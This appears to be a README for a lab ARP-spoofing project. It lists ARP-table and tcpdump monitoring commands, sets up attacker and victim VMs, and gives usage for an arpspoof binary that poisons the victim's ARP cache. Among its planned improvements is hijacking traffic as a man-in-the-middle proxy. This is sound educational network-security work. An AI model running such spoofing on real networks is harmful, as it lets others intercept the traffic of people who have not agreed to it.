
# ARP-spoofing

## Experiments

Watch arp table:

```
watch arp -a
```

Clear arp table:

```
arp -ad
```

Listen arp req/res:

```
tcpdump -nnti en0 arp or icmp
```

Ping everybody on the network:

```
BROADCAST_ADDR=$(ip addr show en0 | grep 'inet .* brd ' | head -1 | sed -e 's/^.* brd \([0-9\.]*\) .*$/\1/')
ping ${BROADCAST_ADDR}
```

## Run arp spoofing

```
make re
```

Infra on vmware:
- 2 vms (attacker: 172.16.42.128, victim: 172.16.42.129)
- 1 host/router (172.16.42.1)
- 1 shared network (virtual)

```
# on 3 machines
tcpdump -nnti <iface> arp
```

```
# on victim machine
watch arp
```

```
# on attacker machine
# usage: ./arpspoof <spoofed-ip> <target-ip> <if>
./arpspoof 172.16.42.1 172.16.42.129 ens37
```

See what happens in `arp` output of the victim ;)

## Debug

https://hpd.gasmi.net/

## Improvements

- missing checks un `datagram_unserialize()` function
- maintain a list of victim and broadcast attack to every machines
- hijack network traffic and become a proxy to the router ^^
- ipv6
